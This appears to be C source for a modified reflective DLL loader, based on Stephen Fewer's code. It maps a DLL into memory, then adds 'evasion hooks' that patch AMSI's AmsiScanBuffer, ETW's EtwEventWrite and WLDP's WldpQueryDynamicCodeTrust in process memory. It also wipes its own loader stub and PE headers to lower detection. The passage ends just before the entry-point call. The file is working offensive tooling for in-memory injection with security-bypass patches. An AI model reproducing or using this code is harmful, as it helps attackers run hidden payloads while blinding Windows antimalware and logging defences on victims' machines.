//===============================================================================================//
// Copyright (c) 2012, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
// conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
// conditions and the following disclaimer in the documentation and/or other materials provided 
// with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
#include "ReflectiveLoader.h"
#include <amsi.h>

#define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN

typedef void(__cdecl* FREE)(void*);
typedef void(__cdecl* __MOVSB)(unsigned char*, unsigned const char*, size_t);
typedef void* (__cdecl* CALLOC)(size_t, size_t);
typedef int(__cdecl* MBSTOWCS_S)(size_t*, wchar_t*, size_t, const char*, size_t);
typedef int(__cdecl* _WCSNICMP)(const wchar_t*, const wchar_t*, size_t);
typedef size_t(__cdecl* STRNLEN)(const char*, size_t);
typedef size_t(__cdecl* STRLEN)(const char*);
typedef int(__cdecl* STRCMP)(const char*, const char*);
typedef int(__cdecl* WCSCMP)(const wchar_t*, const wchar_t*);
typedef int(__cdecl* MEMCMP)(const void* ptr1, const void* ptr2, size_t num);
typedef const char* (__cdecl* STRSTR)(const char* str1, const char* str2);
typedef BOOL(WINAPI* VIRTUALFREE)(LPVOID, SIZE_T, DWORD);
typedef HANDLE(WINAPI* CREATEFILEW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef HANDLE(WINAPI* CREATEFILEMAPPINGW)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCWSTR);
typedef LPVOID(WINAPI* MAPVIEWOFFILE)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef LPVOID(WINAPI* VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* UNMAPVIEWOFFILE)(LPCVOID);
typedef void (WINAPI* CLOSEHANDLE)(HANDLE);
typedef HMODULE(WINAPI* LOADLIBRARYW)(LPCWSTR);
typedef BOOL(WINAPI* VIRTUALPROTECT)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HMODULE(WINAPI* GETMODULEHANDLEW)(LPCWSTR);
typedef void (WINAPI* OUTPUTDEBUGSTR)(const char*);

struct FunctionPointers {
    FREE pfree;
    __MOVSB p__movsb;
    CALLOC pcalloc;
    MBSTOWCS_S pmbstowcs_s;
    _WCSNICMP p_wcsnicmp;
    STRLEN pstrlen;
    STRCMP pstrcmp;
    WCSCMP pwcscmp;
    MEMCMP pmemcmp;
    STRSTR pstrstr;
    STRNLEN pstrnlen;
    VIRTUALFREE pVirtualFree;
    CREATEFILEW pCreateFileW;
    CREATEFILEMAPPINGW pCreateFileMappingW;
    MAPVIEWOFFILE pMapViewOfFile;
    VIRTUALALLOC pVirtualAlloc;
    UNMAPVIEWOFFILE pUnmapViewOfFile;
    CLOSEHANDLE pCloseHandle;
    LOADLIBRARYW pLoadLibraryW;
    VIRTUALPROTECT pVirtualProtect;
    GETMODULEHANDLEW pGetModuleHandleW;
    OUTPUTDEBUGSTR pOutputDebugStringA;
};



//===============================================================================================//
// Our loader will set this to a pseudo correct HINSTANCE/HMODULE value
HINSTANCE hAppInstance = NULL;

// Note 1: If you want to have your own DllMain, define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN,  
//         otherwise the DllMain at the end of this file will be used.

// Note 2: If you are injecting the DLL via LoadRemoteLibraryR, define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR,
//         otherwise it is assumed you are calling the ReflectiveLoader via a stub.

DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter );
__declspec(noinline) ULONG_PTR caller( VOID );


//===============================================================================================//

// This is our position independent reflective DLL loader/injector
#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )
#else
DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
#endif
{
    // the functions we need
    LOADLIBRARYA pLoadLibraryA     = NULL;
    GETPROCADDRESS pGetProcAddress = NULL;
    VIRTUALALLOC pVirtualAlloc     = NULL;
    OUTPUTDEBUGSTR pOutputDebugString = NULL;
    VIRTUALPROTECT pVirtualProtect = NULL;
    NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = NULL;

    USHORT usCounter;

    // the initial location of this image in memory
    ULONG_PTR uiLibraryAddress;
    // the kernels base address and later this images newly loaded base address
    ULONG_PTR uiBaseAddress;

    // variables for processing the kernels export table
    ULONG_PTR uiAddressArray;
    ULONG_PTR uiNameArray;
    ULONG_PTR uiExportDir;
    ULONG_PTR uiNameOrdinals;
    DWORD dwHashValue;

    // variables for loading this image
    ULONG_PTR uiHeaderValue;
    ULONG_PTR uiValueA;
    ULONG_PTR uiValueB;
    ULONG_PTR uiValueC;
    ULONG_PTR uiValueD;
    ULONG_PTR uiValueE;

    DWORD oldProt = 0;

    // STEP 0: calculate our images current base address

    // we will start searching backwards from our callers return address.
    uiLibraryAddress = caller();

    // loop through memory backwards searching for our images base address
    // we dont need SEH style search as we shouldnt generate any access violations with this
    while( TRUE )
    {
        if( ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_magic == IMAGE_DOS_SIGNATURE )
        {
            uiHeaderValue = ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
            // some x64 dll's can trigger a bogus signature (IMAGE_DOS_SIGNATURE == 'POP r10'),
            // we sanity check the e_lfanew with an upper threshold value of 1024 to avoid problems.
            if( uiHeaderValue >= sizeof(IMAGE_DOS_HEADER) && uiHeaderValue < 1024 )
            {
                uiHeaderValue += uiLibraryAddress;
                // break if we have found a valid MZ/PE header
                if( ((PIMAGE_NT_HEADERS)uiHeaderValue)->Signature == IMAGE_NT_SIGNATURE )
                    break;
            }
        }
        uiLibraryAddress--;
    }

    // STEP 1: process the kernels exports for the functions our loader needs...

    // get the Process Enviroment Block
#ifdef WIN_X64
    uiBaseAddress = __readgsqword( 0x60 );
#else
#ifdef WIN_X86
    uiBaseAddress = __readfsdword( 0x30 );
#else WIN_ARM
    uiBaseAddress = *(DWORD *)( (BYTE *)_MoveFromCoprocessor( 15, 0, 13, 0, 2 ) + 0x30 );
#endif
#endif

    ULONG_PTR kernel32BaseAddress = (ULONG_PTR)NULL;

    // get the processes loaded modules. ref: http://msdn.microsoft.com/en-us/library/aa813708(VS.85).aspx
    uiBaseAddress = (ULONG_PTR)((_PPEB)uiBaseAddress)->pLdr;

    // get the first entry of the InMemoryOrder module list
    uiValueA = (ULONG_PTR)((PPEB_LDR_DATA)uiBaseAddress)->InMemoryOrderModuleList.Flink;
    while( uiValueA )
    {
        // get pointer to current modules name (unicode string)
        uiValueB = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.pBuffer;

        // set bCounter to the length for the loop
        usCounter = ((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.Length;
        // clear uiValueC which will store the hash of the module name
        uiValueC = 0;

        // compute the hash of the module name...
        do
        {
            uiValueC = ror( (DWORD)uiValueC );
            // normalize to uppercase if the module name is in lowercase

            if( *((BYTE *)uiValueB) >= 'a' )
                uiValueC += *((BYTE *)uiValueB) - 0x20;
            else
                uiValueC += *((BYTE *)uiValueB);
            uiValueB++;
        } while( --usCounter );

        // compare the hash with that of kernel32.dll
        if( (DWORD)uiValueC == KERNEL32DLL_HASH )
        {
            // get this modules base address
            uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;

            kernel32BaseAddress = uiBaseAddress;

            // get the VA of the modules NT Header
            uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

            // uiNameArray = the address of the modules export directory entry
            uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

            // get the VA of the export directory
            uiExportDir = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );

            // get the VA for the array of name pointers
            uiNameArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames );
            
            // get the VA for the array of name ordinals
            uiNameOrdinals = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals );

            // Number of imports to resolve
            usCounter = 4;

            // loop while we still have imports to find
            while( usCounter > 0 )
            {
                // compute the hash values for this function name
                dwHashValue = hash( (char *)( uiBaseAddress + DEREF_32( uiNameArray ) )  );
                
                // if we have found a function we want we get its virtual address
                if( dwHashValue == LOADLIBRARYA_HASH 
                    || dwHashValue == GETPROCADDRESS_HASH 
                    || dwHashValue == VIRTUALALLOC_HASH 
                    || dwHashValue == VIRTUALPROTECT_HASH
                )
                {
                    // get the VA for the array of addresses
                    uiAddressArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );

                    // use this functions name ordinal as an index into the array of name pointers
                    uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );

                    // store this functions VA
                    if (dwHashValue == LOADLIBRARYA_HASH)
                        pLoadLibraryA = (LOADLIBRARYA)(uiBaseAddress + DEREF_32(uiAddressArray));
                    else if (dwHashValue == GETPROCADDRESS_HASH)
                        pGetProcAddress = (GETPROCADDRESS)(uiBaseAddress + DEREF_32(uiAddressArray));
                    else if (dwHashValue == VIRTUALALLOC_HASH)
                        pVirtualAlloc = (VIRTUALALLOC)(uiBaseAddress + DEREF_32(uiAddressArray));
                    else if (dwHashValue == VIRTUALPROTECT_HASH)
                        pVirtualProtect = (VIRTUALPROTECT)(uiBaseAddress + DEREF_32(uiAddressArray));
            
                    // decrement our counter
                    usCounter--;
                }

                // get the next exported function name
                uiNameArray += sizeof(DWORD);

                // get the next exported function name ordinal
                uiNameOrdinals += sizeof(WORD);
            }
        }
        else if( (DWORD)uiValueC == NTDLLDLL_HASH )
        {
            // get this modules base address
            uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;

            // get the VA of the modules NT Header
            uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

            // uiNameArray = the address of the modules export directory entry
            uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

            // get the VA of the export directory
            uiExportDir = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );

            // get the VA for the array of name pointers
            uiNameArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames );
            
            // get the VA for the array of name ordinals
            uiNameOrdinals = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals );

            usCounter = 1;

            // loop while we still have imports to find
            while( usCounter > 0 )
            {
                // compute the hash values for this function name
                dwHashValue = hash( (char *)( uiBaseAddress + DEREF_32( uiNameArray ) )  );
                
                // if we have found a function we want we get its virtual address
                if( dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH )
                {
                    // get the VA for the array of addresses
                    uiAddressArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );

                    // use this functions name ordinal as an index into the array of name pointers
                    uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );

                    // store this functions VA
                    if( dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH )
                        pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)( uiBaseAddress + DEREF_32( uiAddressArray ) );

                    // decrement our counter
                    usCounter--;
                }

                // get the next exported function name
                uiNameArray += sizeof(DWORD);

                // get the next exported function name ordinal
                uiNameOrdinals += sizeof(WORD);
            }
        }

        // we stop searching when we have found everything we need.
        if( pLoadLibraryA && pGetProcAddress && pVirtualAlloc && pNtFlushInstructionCache && pVirtualProtect)
            break;

        // get the next entry
        uiValueA = DEREF( uiValueA );
    }

    // STEP 2: load our image into a new permanent location in memory...

    // get the VA of the NT Header for the PE to be loaded
    uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

    // allocate all the memory for the DLL to be loaded into. we can load at any address because we will  
    // relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.
    uiBaseAddress = (ULONG_PTR)pVirtualAlloc( NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );

    // we must now copy over the headers
    uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
    uiValueB = uiLibraryAddress;
    uiValueC = uiBaseAddress;

    while( uiValueA-- )
        *(BYTE *)uiValueC++ = *(BYTE *)uiValueB++;

    // STEP 3: load in all of our sections...

    // uiValueA = the VA of the first section
    uiValueA = ( (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader );
    
    // itterate through all sections, loading them into memory.
    uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
    while( uiValueE-- )
    {
        // uiValueB is the VA for this section
        uiValueB = ( uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress );

        // uiValueC if the VA for this sections data
        uiValueC = ( uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData );

        // copy the section over
        uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;

        while( uiValueD-- )
            *(BYTE *)uiValueB++ = *(BYTE *)uiValueC++;

        // get the VA of the next section
        uiValueA += sizeof( IMAGE_SECTION_HEADER );
    }

    // STEP 4: process our images import table...

    // uiValueB = the address of the import directory
    uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];
    
    // we assume their is an import table to process
    // uiValueC is the first entry in the import table
    uiValueC = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress );
    
    // itterate through all imports
    while( ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name )
    {
        // use LoadLibraryA to load the imported module into memory
        uiLibraryAddress = (ULONG_PTR)pLoadLibraryA( (LPCSTR)( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name ) );

        // uiValueD = VA of the OriginalFirstThunk
        uiValueD = ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->OriginalFirstThunk );
    
        // uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
        uiValueA = ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->FirstThunk );

        // itterate through all imported functions, importing by ordinal if no name present
        while( DEREF(uiValueA) )
        {
            // sanity check uiValueD as some compilers only import by FirstThunk
            if( uiValueD && ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
            {
                // get the VA of the modules NT Header
                uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

                // uiNameArray = the address of the modules export directory entry
                uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

                // get the VA of the export directory
                uiExportDir = ( uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );

                // get the VA for the array of addresses
                uiAddressArray = ( uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );

                // use the import ordinal (- export ordinal base) as an index into the array of addresses
                uiAddressArray += ( ( IMAGE_ORDINAL( ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal ) - ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->Base ) * sizeof(DWORD) );

                // patch in the address for this imported function
                DEREF(uiValueA) = ( uiLibraryAddress + DEREF_32(uiAddressArray) );
            }
            else
            {
                // get the VA of this functions import by name struct
                uiValueB = ( uiBaseAddress + DEREF(uiValueA) );

                // use GetProcAddress and patch in the address for this imported function
                DEREF(uiValueA) = (ULONG_PTR)pGetProcAddress( (HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name );
            }
            // get the next imported function
            uiValueA += sizeof( ULONG_PTR );
            if( uiValueD )
                uiValueD += sizeof( ULONG_PTR );
        }

        // get the next import
        uiValueC += sizeof( IMAGE_IMPORT_DESCRIPTOR );
    }

    // STEP 5: process all of our images relocations...

    // calculate the base address delta and perform relocations (even if we load at desired image base)
    uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;

    // uiValueB = the address of the relocation directory
    uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];

    // check if their are any relocations present
    if( ((PIMAGE_DATA_DIRECTORY)uiValueB)->Size )
    {
        // uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
        uiValueC = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress );

        // and we itterate through all entries...
        while( ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock )
        {
            // uiValueA = the VA for this relocation block
            uiValueA = ( uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress );

            // uiValueB = number of entries in this relocation block
            uiValueB = ( ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) ) / sizeof( IMAGE_RELOC );

            // uiValueD is now the first entry in the current relocation block
            uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);

            // we itterate through all the entries in the current block...
            while( uiValueB-- )
            {
                // perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
                // we dont use a switch statement to avoid the compiler building a jump table
                // which would not be very position independent!
                if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64 )
                    *(ULONG_PTR *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
                else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW )
                    *(DWORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;
#ifdef WIN_ARM
                // Note: On ARM, the compiler optimization /O2 seems to introduce an off by one issue, possibly a code gen bug. Using /O1 instead avoids this problem.
                else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_ARM_MOV32T )
                {   
                    register DWORD dwInstruction;
                    register DWORD dwAddress;
                    register WORD wImm;
                    // get the MOV.T instructions DWORD value (We add 4 to the offset to go past the first MOV.W which handles the low word)
                    dwInstruction = *(DWORD *)( uiValueA + ((PIMAGE_RELOC)uiValueD)->offset + sizeof(DWORD) );
                    // flip the words to get the instruction as expected
                    dwInstruction = MAKELONG( HIWORD(dwInstruction), LOWORD(dwInstruction) );
                    // sanity chack we are processing a MOV instruction...
                    if( (dwInstruction & ARM_MOV_MASK) == ARM_MOVT )
                    {
                        // pull out the encoded 16bit value (the high portion of the address-to-relocate)
                        wImm  = (WORD)( dwInstruction & 0x000000FF);
                        wImm |= (WORD)((dwInstruction & 0x00007000) >> 4);
                        wImm |= (WORD)((dwInstruction & 0x04000000) >> 15);
                        wImm |= (WORD)((dwInstruction & 0x000F0000) >> 4);
                        // apply the relocation to the target address
                        dwAddress = ( (WORD)HIWORD(uiLibraryAddress) + wImm ) & 0xFFFF;
                        // now create a new instruction with the same opcode and register param.
                        dwInstruction  = (DWORD)( dwInstruction & ARM_MOV_MASK2 );
                        // patch in the relocated address...
                        dwInstruction |= (DWORD)(dwAddress & 0x00FF);
                        dwInstruction |= (DWORD)(dwAddress & 0x0700) << 4;
                        dwInstruction |= (DWORD)(dwAddress & 0x0800) << 15;
                        dwInstruction |= (DWORD)(dwAddress & 0xF000) << 4;
                        // now flip the instructions words and patch back into the code...
                        *(DWORD *)( uiValueA + ((PIMAGE_RELOC)uiValueD)->offset + sizeof(DWORD) ) = MAKELONG( HIWORD(dwInstruction), LOWORD(dwInstruction) );
                    }
                }
#endif
                else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH )
                    *(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += HIWORD(uiLibraryAddress);
                else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW )
                    *(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += LOWORD(uiLibraryAddress);

                // get the next entry in the current relocation block
                uiValueD += sizeof( IMAGE_RELOC );
            }

            // get the next entry in the relocation directory
            uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
        }
    }

    //
    // Step 6: Adjust section permissions
    //

    // uiValueA = the VA of the first section
    uiValueA = ((ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader);

    uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;

    while (uiValueE--)
    {
        // uiValueB is the VA for this section
        uiValueB = (uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress);

        pVirtualProtect(
            (LPVOID)uiValueB,
            ((PIMAGE_SECTION_HEADER)uiValueA)->Misc.VirtualSize,
            translate_protect(((PIMAGE_SECTION_HEADER)uiValueA)->Characteristics),
            &oldProt
        );

        // get the VA of the next section
        uiValueA += sizeof(IMAGE_SECTION_HEADER);
    }

    //
    // STEP 7: apply evasion hooks
    //
    // Based on:
    //   - https://modexp.wordpress.com/2019/06/03/disable-amsi-wldp-dotnet/
    //

    if (pLoadLibraryA != NULL && pGetProcAddress != NULL && pVirtualProtect != NULL) {
        // Due to PIC requirements imposed on the code, the below string literal has to be split into characters
        // to make compiler generate registers assignment string's initialization
        // https://gist.github.com/EvanMcBroom/f5b1bc53977865773802d795ade67273

        // 7.1.Modules unhooking / refreshing
        // THIS_VALUE_WILL_BE_REPLACED
        char buf0[] = { 'T', 'H', 'I', 'S', '_', 'V', 'A', 'L', 'U', 'E', '_', 'W', 'I', 'L', 'L', '_', 'B', 'E', '_', 'R', 'E', 'P', 'L', 'A', 'C', 'E', 'D', '\x00' };
        RefreshPE(buf0, pLoadLibraryA, pGetProcAddress);

        // 7.2. AMSI hook
        const char buf2[] = { 'a', 'm', 's', 'i', '\x00' };
        HMODULE amsi = pLoadLibraryA(buf2);
        if (amsi != NULL) {
            const char buf3[] = { 'A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r', '\x00' };

            LPVOID pAmsiScanBuffer = pGetProcAddress(amsi, buf3);

            if (pAmsiScanBuffer != NULL) {
                DWORD temp = 0;

                // Strategy1: Look for `AMSI` constant DWORD used in the code of AmsiScanBuffer:
                //      AmsiScanBuffer+76:
                //      .text:0000000180003656 74 5D                jz      short loc_1800036B5
                //      .text:0000000180003658 48 85 DB             test    rbx, rbx
                //      .text:000000018000365B 74 58                jz      short loc_1800036B5
                //      .text:000000018000365D 81 3B 41 4D 53 49    cmp     dword ptr [rbx], 'ISMA'   <====
                //      .text:0000000180003663 75 50                jnz     short loc_1800036B5
                //      .text:0000000180003665 48 8B 43 08          mov     rax, [rbx+8]

                for (unsigned int i = 0; i < 300; i++) {
                    _PHAMSICONTEXT ctx = (_PHAMSICONTEXT) & ((char*)pAmsiScanBuffer)[i];

                    if (ctx->Signature == 0x49534D41 /* 'AMSI' */) {
                        if (pVirtualProtect(pAmsiScanBuffer, sizeof(ULONG_PTR), PAGE_EXECUTE_READWRITE, &oldProt))
                        {
                            // change signature
                            ctx->Signature++;
                            pVirtualProtect(pAmsiScanBuffer, sizeof(ULONG_PTR), oldProt, &temp);
                        }
                    }
                }
            }
        }

        // 7.3. ETW hook
        const char buf4[] = { 'n', 't', 'd', 'l', 'l', '\x00' };
        HMODULE ntdll = pLoadLibraryA(buf4);
        if (ntdll != NULL) {
            const char buf5[] = { 'E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'W', 'r', 'i', 't', 'e', '\x00' };
            LPVOID pEtwEventWrite = pGetProcAddress(ntdll, buf5);

            if (pEtwEventWrite != NULL) {
                DWORD oldProt = 0, temp = 0;

                if (pVirtualProtect(pEtwEventWrite, ETW_PATCH_SIZE, PAGE_EXECUTE_READWRITE, &oldProt))
                {
                    const char buf[] = ETW_PATCH_BYTES;
                    for (unsigned int i = 0; i < ETW_PATCH_SIZE; i++)
                    {
                        ((char*)pEtwEventWrite)[i] = buf[i];
                    }

                    pVirtualProtect(pEtwEventWrite, ETW_PATCH_SIZE, oldProt, &temp);
                }
            }
        }

        // 7.4. WLDP (Windows Lockdown Policy) hook
        const char buf6[] = { 'w', 'l', 'd', 'p', '\x00' };
        HMODULE wldp = pLoadLibraryA(buf6);
        if (wldp != NULL) {
            const char buf7[] = { 'W', 'l', 'd', 'p', 'Q', 'u', 'e', 'r', 'y', 'D', 'y', 'n', 'a', 'm', 'i', 'c', 'C', 'o', 'd', 'e', 'T', 'r', 'u', 's', 't', '\x00' };
            LPVOID pWldpQueryDynamicCodeTrust = pGetProcAddress(wldp, buf7);

            DWORD oldProt = 0, temp = 0;

            if (pWldpQueryDynamicCodeTrust != NULL) {
                if (pVirtualProtect(pWldpQueryDynamicCodeTrust, ETW_PATCH_SIZE, PAGE_EXECUTE_READWRITE, &oldProt))
                {
                    // WLDP patch uses the same sequence of bytes that EtwEventWrite does. Just simply returns 0

                    const char buf[] = ETW_PATCH_BYTES;
                    for (unsigned int i = 0; i < ETW_PATCH_SIZE; i++)
                    {
                        ((char*)pWldpQueryDynamicCodeTrust)[i] = buf[i];
                    }

                    pVirtualProtect(pWldpQueryDynamicCodeTrust, ETW_PATCH_SIZE, oldProt, &temp);
                }
            }
        } 
    }
    

    //
    // Step 8: Overwrite our ReflectiveLoader stub to lower detection potential.
    //

    DWORD bytesToOverwrite = 0;

    // Below meaningless if statement is placed here merely to let the further code compute 
    // number of bytes that should get overwritten.
    if (uiValueA == 'ABCD') {
        uiHeaderValue ^= 0xAF;
    }

    //
    // Above code will consist of a stream of 0x00 bytes.
    //
    // v------------------------------------------------^
    //
    // Below code remains intact (not overwritten).
    //

    const DWORD offset = (((DWORD)((BYTE*)&ReflectiveLoader)) & 0xfff);
    BYTE* ptr = (BYTE*)&ReflectiveLoader;
    ptr -= offset;

    while (bytesToOverwrite++ < 6000) {
        if (*(DWORD*)&ptr[bytesToOverwrite] == 'ABCD') {

            if (pVirtualProtect(ptr, bytesToOverwrite, PAGE_EXECUTE_READWRITE, &oldProt)) {

                //
                // Overwrites ReflectiveLoader function's bytes up to the above
                // if (value == 'ABCD') statement.
                //
                for (unsigned int i = 0; i < bytesToOverwrite; i++)
                    *ptr++ = 0;

                pVirtualProtect(ptr, bytesToOverwrite, PAGE_EXECUTE_READ, &oldProt);
            }

            break;
        }
    }

    // uiValueA = the VA of our newly loaded DLL/EXE's entry point
    uiValueA = (uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint);

    uiValueB = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
    uiValueC = uiBaseAddress;

    // Finally, wipe PE headers residing on the beginning of the allocation with
    // this Reflective Loader.
    while (uiValueB--)
        *(BYTE*)uiValueC++ = 0;

    // STEP 9: call our images entry point

    // We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
    pNtFlushInstructionCache((HANDLE)-1, NULL, 0);

